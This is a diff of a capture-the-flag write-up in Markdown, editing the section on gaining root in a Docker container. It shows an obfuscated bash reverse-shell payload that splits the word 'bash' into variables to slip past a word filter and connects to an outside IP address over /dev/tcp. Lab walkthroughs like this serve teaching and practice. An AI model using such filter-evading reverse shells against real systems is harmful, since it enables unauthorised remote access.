@@ -207,14 +207,7 @@ Curling the request and we get the flag for user.
 
 ## Root (Docker Container)
 
-Time to get on the box to make enumeration easier. 
-
-```
-Sent: 
-Response: 
-```
-
-With this in mind I started to craft a payload that would work to bypass the word filter. 
+I started to craft a payload that would work to bypass the word filter. 
 
 ```
 a="ba";b="sh";echo "$a$b -c '$a$b -i >& /dev/tcp/10.8.153.120/9999 0>&1'" 
